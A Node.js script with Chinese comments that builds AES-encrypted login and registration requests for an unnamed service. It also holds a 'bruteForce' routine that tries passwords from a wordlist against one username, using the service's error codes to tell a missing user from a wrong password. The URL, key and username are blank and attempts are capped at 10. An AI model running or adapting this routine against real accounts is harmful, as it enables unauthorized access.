/* @format */

const Axios = require('axios');
const CryptoJS = require('crypto-js');
const readline = require('readline');
const path = require('path');
const fs = require('fs');

const requests = Axios.create();
const KEY = "";
const requestOptions = {
    headers: {
        "content-type": "application/json;charset=UTF-8",
    },
    transformResponse: [
        function transformResponse(data) {
            /*eslint no-param-reassign:0*/
            if (typeof data === 'string') {
                try {
                data = JSON.parse(data);
                } catch (e) {
                /* Ignore */
                }
            }
            return data;
        }
    ]
};

function encryptRequest(t, encoder) {
    encoder = encoder || false;
    const e = CryptoJS.enc.Utf8.parse(KEY);
    const i = CryptoJS.enc.Utf8.parse(t);
    const r = CryptoJS.AES.encrypt(i, e, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    }).toString();
    return encoder ? base64Encode(r) : r;
}

function decryptRequest(t, encoder) {
    encoder = encoder || false;
    const e = CryptoJS.enc.Utf8.parse(KEY);
    if(encoder) t = base64Decode(t);
    const i = CryptoJS.AES.decrypt(t, e, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    });
    return CryptoJS.enc.Utf8.stringify(i).toString(CryptoJS.enc.Utf8);
}

function base64Encode(word) {
    // encrypt
    const wordArray = CryptoJS.enc.Utf8.parse(word);
    return CryptoJS.enc.Base64.stringify(wordArray);
}

function base64Decode(word) {
    // decrypt
    // word = word.replace(/[\n]/g, '');
    const parsedWordArray = CryptoJS.enc.Base64.parse(word);
    return parsedWordArray.toString(CryptoJS.enc.Utf8);
}

function generateData(data, encrypt) {
    encrypt = encrypt || false;
    return encrypt ? {"endata": encryptRequest(data)} : data;
}

function genLoginData(username, password, encrypt) {
    const data = JSON.stringify({
        "clientType": 1,
        "userName": username,
        "password": password
    });
    return generateData(data, encrypt);
}


async function doLogin(username, password) {
    const data = genLoginData(username, password);
    const url = "";
    const response = await requests.post(url, data, requestOptions);
    return response.data;
}

async function check(username, password) {
    let data = null;
    try {
        data = await doLogin(username, password)
    } catch (e) {
        console.error(e);
        return 1;
    }
    if (!data) {
        return 1;
    }
    const code = data.code;
    if (code === 0) {
        console.log(`登录成功！密码为: ${password}`)
        return 0;
    } else if (code === 1 ){
        const user = JSON.parse(decryptRequest(data.endata))
        const subCode = user.code;
        // 用户不存在
        if (subCode === 1001) {
            console.log("用户不存在")
            return 1;
        } else if (subCode === 1005) {
            // console.log("用户密码错误")
            return 2;
        } else if (subCode === 1017) {
            console.log(`脚本异常: ${user.message}`)
            return 1;
        } else {
            console.log(`未知异常: ${user.message}`)
            return 1;
        }
    } else {
        console.log("未知错误")
        return 1;
    }
}

function genRegisterData(username, password, encrypt) {
    const data = {
        "clientType": 1,
        "userName": username,
        "password": password,
        "code": "",
        "agentId": "" // 邀请用户ID
    }
    return generateData(data, encrypt);

}

async function doRegister(username, password) {
    const url = "";
    const data = genRegisterData(username, password);
    const response = await requests.post(url, data, requestOptions);
    return response.data;
}

async function register() {
    // 注册
    const data = await doRegister("", "");
    console.log(decryptRequest(data.endata));
}

async function bruteForce() {
    // 暴力破解
    const username = "";
    let filepath = path.join(__dirname, "passwords.txt")
    let input = fs.createReadStream(filepath)
    const file_interface = readline.createInterface({
        input: input
    });
    let num = 0;
    const maxRetries = 10;
    for await (const password of file_interface) {
        num += 1;
        if (num % 2 === 0) {
            console.log(`当前进度: ${num}`)
        }
        const code = await check(username, password)
        if ([0, 1].includes(code)) {
            file_interface.close();
            return
        }

        if (num >= maxRetries) {
            console.log(`尝试了 ${num} 个密码，停止尝试`)
            break;
        }
    }
    console.log(`${filepath} 文件中前 ${num} 项都不匹配`)
    return
}

async function work() {
    console.log("start...");
    const encoder = true;
    const encryptStr = encryptRequest("中文1234", encoder);
    console.log(encoder, encryptStr);
    console.log(decryptRequest(encryptStr, encoder));
    console.log("end...");
}


async function main() {
    await work().catch(console.dir);
}

if (require.main === module) {
    main().catch((e) =>
        setTimeout(() => {
            throw e;
        })
    );
}
